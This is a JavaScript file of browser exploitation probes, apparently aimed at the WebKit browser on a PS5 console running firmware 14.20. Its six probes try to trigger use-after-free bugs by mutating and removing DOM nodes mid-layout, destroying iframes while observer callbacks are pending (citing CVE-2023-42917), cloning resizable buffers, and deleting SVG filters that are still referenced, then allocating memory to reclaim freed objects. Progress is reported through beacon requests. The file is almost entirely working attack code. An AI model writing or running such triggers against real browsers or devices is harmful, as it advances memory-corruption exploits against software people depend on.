// p185 — DOM UAF probes for PS5 14.20
// Tests multiple non-JIT attack surfaces:
// 1. CSS content-visibility support detection
// 2. content-visibility toggle during DOM mutation (bug 287908 pattern)
// 3. iframe navigation during pending callbacks (CVE-2023-42917 pattern)
// 4. DOM node removal during mutation observer (general UAF pattern)
// 5. structuredClone with ResizableArrayBuffer edge cases
//
// Beacon prefix: V185-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V185-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // ================================================================
  // PROBE 1: CSS content-visibility support
  // ================================================================
  try {
    syncB('P1-START');
    var testDiv = document.createElement('div');
    document.body.appendChild(testDiv);

    var hasCV = false;
    try {
      testDiv.style.contentVisibility = 'hidden';
      hasCV = (testDiv.style.contentVisibility === 'hidden');
    } catch(e) {}

    if (!hasCV) {
      try {
        testDiv.style.setProperty('content-visibility', 'hidden');
        var computed = getComputedStyle(testDiv).getPropertyValue('content-visibility');
        hasCV = (computed === 'hidden');
      } catch(e) {}
    }

    syncB('P1-CV-' + (hasCV ? 'YES' : 'NO'));

    if (hasCV) {
      // Test content-visibility: auto (the more complex path)
      testDiv.style.contentVisibility = 'auto';
      var autoWorks = (testDiv.style.contentVisibility === 'auto');
      syncB('P1-AUTO-' + (autoWorks ? 'YES' : 'NO'));
    }

    testDiv.remove();
    syncB('P1-DONE');
  } catch(e) {
    syncB('P1-ERR-' + (e.message || '').substring(0, 40));
  }

  // ================================================================
  // PROBE 2: content-visibility UAF trigger (bug 287908 pattern)
  // Toggle content-visibility while removing child nodes
  // If content-visibility is supported, this may trigger UAF
  // ================================================================
  try {
    syncB('P2-START');

    var container = document.createElement('div');
    container.style.cssText = 'width:200px;height:200px;overflow:hidden;';
    document.body.appendChild(container);

    var alive = true;
    var iterations = 0;
    var MAX_ITER = 500;

    function runCVToggle() {
      if (!alive || iterations >= MAX_ITER) {
        syncB('P2-DONE-' + iterations);
        container.remove();
        return;
      }
      iterations++;

      // Create child tree
      var wrapper = document.createElement('div');
      wrapper.style.contentVisibility = 'auto';
      wrapper.style.containIntrinsicSize = '0 500px';

      for (var i = 0; i < 10; i++) {
        var child = document.createElement('div');
        child.textContent = 'content ' + i;
        child.style.height = '50px';
        wrapper.appendChild(child);
      }
      container.appendChild(wrapper);

      // Force layout
      void container.offsetHeight;

      // Toggle visibility while removing children
      wrapper.style.contentVisibility = 'hidden';

      // Remove children during the visibility change
      while (wrapper.firstChild) {
        wrapper.removeChild(wrapper.firstChild);
      }

      // Toggle back
      wrapper.style.contentVisibility = 'auto';

      // Force another layout
      void container.offsetHeight;

      // Remove the wrapper itself
      wrapper.remove();

      if (iterations % 100 === 0) {
        syncB('P2-ITER-' + iterations);
      }

      requestAnimationFrame(runCVToggle);
    }

    requestAnimationFrame(runCVToggle);

    setTimeout(function() {
      alive = false;
    }, 5000);

  } catch(e) {
    syncB('P2-ERR-' + (e.message || '').substring(0, 40));
  }

  // ================================================================
  // PROBE 3: iframe navigation during async callback (42917 pattern)
  // Fire multiple async operations then navigate/destroy iframe
  // The "improved locking" fix suggests a race between rendering
  // thread and main thread during navigation
  // ================================================================
  try {
    syncB('P3-START');

    var p3Done = false;
    var p3Count = 0;
    var P3_ROUNDS = 20;

    function p3Round() {
      if (p3Done || p3Count >= P3_ROUNDS) {
        syncB('P3-DONE-' + p3Count);
        return;
      }
      p3Count++;

      var f = document.createElement('iframe');
      f.srcdoc = '<html><body><div id="target" style="width:100px;height:100px;background:red;"></div><script>' +
        'var obs = new ResizeObserver(function(entries) {' +
        '  for(var e of entries) { e.target.style.width = (Math.random()*200)+"px"; }' +
        '});' +
        'obs.observe(document.getElementById("target"));' +
        'var mo = new MutationObserver(function(muts) {' +
        '  for(var m of muts) { m.target.style.height = (Math.random()*200)+"px"; }' +
        '});' +
        'mo.observe(document.getElementById("target"), {attributes:true});' +
        'setInterval(function(){document.getElementById("target").setAttribute("data-x",Math.random());},1);' +
        '</script></body></html>';

      document.body.appendChild(f);

      // Let mutations accumulate, then destroy
      setTimeout(function() {
        try {
          // Navigate the iframe (this should trigger cleanup while callbacks pending)
          f.srcdoc = '';
          // Then remove it entirely
          setTimeout(function() {
            f.remove();
            f = null;

            // Allocate to reclaim memory
            for (var g = 0; g < 10000; g++) {
              var tmp = new ArrayBuffer(64);
            }

            setTimeout(p3Round, 10);
          }, 5);
        } catch(e) {}
      }, 50);
    }

    p3Round();

    setTimeout(function() { p3Done = true; }, 10000);
  } catch(e) {
    syncB('P3-ERR-' + (e.message || '').substring(0, 40));
  }

  // ================================================================
  // PROBE 4: MutationObserver + node removal UAF pattern
  // Remove nodes inside mutation observer callback while tree is
  // being iterated. Classic WebKit UAF pattern.
  // ================================================================
  try {
    syncB('P4-START');

    var p4Container = document.createElement('div');
    document.body.appendChild(p4Container);
    var p4Alive = true;
    var p4Iter = 0;

    var p4Observer = new MutationObserver(function(mutations) {
      for (var i = 0; i < mutations.length; i++) {
        var m = mutations[i];
        if (m.type === 'childList' && m.addedNodes.length > 0) {
          // Remove ALL siblings of the added node during the callback
          var parent = m.target;
          var children = Array.prototype.slice.call(parent.childNodes);
          for (var j = children.length - 1; j >= 0; j--) {
            if (children[j] !== m.addedNodes[0]) {
              try { parent.removeChild(children[j]); } catch(e) {}
            }
          }
        }
      }
    });

    p4Observer.observe(p4Container, { childList: true, subtree: true });

    function p4Cycle() {
      if (!p4Alive || p4Iter >= 1000) {
        p4Observer.disconnect();
        p4Container.remove();
        syncB('P4-DONE-' + p4Iter);
        return;
      }
      p4Iter++;

      // Add multiple children rapidly
      for (var i = 0; i < 10; i++) {
        var el = document.createElement('span');
        el.textContent = 'n' + p4Iter + '-' + i;
        p4Container.appendChild(el);
      }

      // Force layout between additions
      void p4Container.offsetHeight;

      if (p4Iter % 200 === 0) syncB('P4-ITER-' + p4Iter);
      requestAnimationFrame(p4Cycle);
    }

    requestAnimationFrame(p4Cycle);
    setTimeout(function() { p4Alive = false; }, 5000);

  } catch(e) {
    syncB('P4-ERR-' + (e.message || '').substring(0, 40));
  }

  // ================================================================
  // PROBE 5: structuredClone edge cases with ResizableArrayBuffer
  // Test if structuredClone handles resizable buffers correctly
  // when the buffer is resized during/after serialization
  // ================================================================
  try {
    syncB('P5-START');

    // 5a: Clone a ResizableArrayBuffer
    var rab = new ArrayBuffer(64, { maxByteLength: 256 });
    var view = new Uint8Array(rab);
    for (var i = 0; i < 64; i++) view[i] = i;

    var cloned = structuredClone(rab);
    var clonedView = new Uint8Array(cloned);
    var match = true;
    for (var i = 0; i < 64; i++) {
      if (clonedView[i] !== i) { match = false; break; }
    }
    syncB('P5-RAB-CLONE-' + (match ? 'OK' : 'FAIL'));
    syncB('P5-RAB-RESIZABLE-' + (cloned.resizable ? 'YES' : 'NO'));
    syncB('P5-RAB-MAXLEN-' + cloned.maxByteLength);

    // 5b: Clone after resize
    rab.resize(128);
    var view2 = new Uint8Array(rab);
    for (var i = 64; i < 128; i++) view2[i] = i;
    var cloned2 = structuredClone(rab);
    syncB('P5-RAB-RESIZE-CLONE-LEN-' + cloned2.byteLength);

    // 5c: Clone a TypedArray view on a resizable buffer
    var rabTA = new ArrayBuffer(128, { maxByteLength: 512 });
    var taView = new Float64Array(rabTA, 0, 8);
    for (var i = 0; i < 8; i++) taView[i] = i * 1.1;
    var clonedTA = structuredClone(taView);
    syncB('P5-TA-CLONE-LEN-' + clonedTA.length + '-VAL0-' + clonedTA[0].toFixed(1));

    // 5d: Transfer a ResizableArrayBuffer
    try {
      var rabTransfer = new ArrayBuffer(64, { maxByteLength: 256 });
      var vtx = new Uint8Array(rabTransfer);
      vtx[0] = 0xAA; vtx[1] = 0xBB;
      var transferred = structuredClone(rabTransfer, { transfer: [rabTransfer] });
      syncB('P5-TRANSFER-OK-LEN-' + transferred.byteLength + '-ORIG-' + rabTransfer.byteLength);
      var tview = new Uint8Array(transferred);
      syncB('P5-TRANSFER-DATA-' + tview[0].toString(16) + '-' + tview[1].toString(16));
    } catch(e) {
      syncB('P5-TRANSFER-ERR-' + (e.message || '').substring(0, 30));
    }

    // 5e: MessageChannel with ResizableArrayBuffer
    try {
      var mc = new MessageChannel();
      var rabMsg = new ArrayBuffer(64, { maxByteLength: 256 });
      var vmsg = new Uint8Array(rabMsg);
      vmsg[0] = 0xCC; vmsg[1] = 0xDD;

      mc.port2.onmessage = function(e) {
        var received = e.data;
        syncB('P5-MSG-RECV-LEN-' + received.byteLength + '-RESIZABLE-' + (received.resizable ? 'Y' : 'N'));
        var rv = new Uint8Array(received);
        syncB('P5-MSG-DATA-' + rv[0].toString(16) + '-' + rv[1].toString(16));
      };

      mc.port1.postMessage(rabMsg, [rabMsg]);
      syncB('P5-MSG-SENT-ORIG-' + rabMsg.byteLength);
    } catch(e) {
      syncB('P5-MSG-ERR-' + (e.message || '').substring(0, 30));
    }

    syncB('P5-DONE');
  } catch(e) {
    syncB('P5-ERR-' + (e.message || '').substring(0, 40));
  }

  // ================================================================
  // PROBE 6: SVG filter chain UAF
  // Rapidly create/destroy SVG filter chains while referencing them
  // SVG filters have been a historical source of UAFs in WebKit
  // ================================================================
  try {
    syncB('P6-START');

    var svgNS = 'http://www.w3.org/2000/svg';
    var p6Alive = true;
    var p6Iter = 0;

    function p6Cycle() {
      if (!p6Alive || p6Iter >= 200) {
        syncB('P6-DONE-' + p6Iter);
        return;
      }
      p6Iter++;

      var svg = document.createElementNS(svgNS, 'svg');
      svg.setAttribute('width', '200');
      svg.setAttribute('height', '200');

      var defs = document.createElementNS(svgNS, 'defs');

      // Create a complex filter chain
      var filter = document.createElementNS(svgNS, 'filter');
      filter.setAttribute('id', 'f' + p6Iter);

      var feBlur = document.createElementNS(svgNS, 'feGaussianBlur');
      feBlur.setAttribute('in', 'SourceGraphic');
      feBlur.setAttribute('stdDeviation', '5');
      feBlur.setAttribute('result', 'blur');
      filter.appendChild(feBlur);

      var feOffset = document.createElementNS(svgNS, 'feOffset');
      feOffset.setAttribute('in', 'blur');
      feOffset.setAttribute('dx', '10');
      feOffset.setAttribute('dy', '10');
      feOffset.setAttribute('result', 'offset');
      filter.appendChild(feOffset);

      var feMerge = document.createElementNS(svgNS, 'feMerge');
      var mergeNode1 = document.createElementNS(svgNS, 'feMergeNode');
      mergeNode1.setAttribute('in', 'offset');
      var mergeNode2 = document.createElementNS(svgNS, 'feMergeNode');
      mergeNode2.setAttribute('in', 'SourceGraphic');
      feMerge.appendChild(mergeNode1);
      feMerge.appendChild(mergeNode2);
      filter.appendChild(feMerge);

      defs.appendChild(filter);
      svg.appendChild(defs);

      // Create a rect that uses the filter
      var rect = document.createElementNS(svgNS, 'rect');
      rect.setAttribute('width', '100');
      rect.setAttribute('height', '100');
      rect.setAttribute('fill', 'red');
      rect.setAttribute('filter', 'url(#f' + p6Iter + ')');
      svg.appendChild(rect);

      document.body.appendChild(svg);

      // Force render
      void svg.getBoundingClientRect();

      // Remove the filter while rect still references it
      defs.removeChild(filter);

      // Force layout with dangling filter reference
      void rect.getBoundingClientRect();
      rect.setAttribute('width', '150');
      void svg.getBoundingClientRect();

      // Remove everything
      svg.remove();

      if (p6Iter % 50 === 0) syncB('P6-ITER-' + p6Iter);
      requestAnimationFrame(p6Cycle);
    }

    requestAnimationFrame(p6Cycle);
    setTimeout(function() { p6Alive = false; }, 5000);

  } catch(e) {
    syncB('P6-ERR-' + (e.message || '').substring(0, 40));
  }

  syncB('PROBES-LAUNCHED');
})();
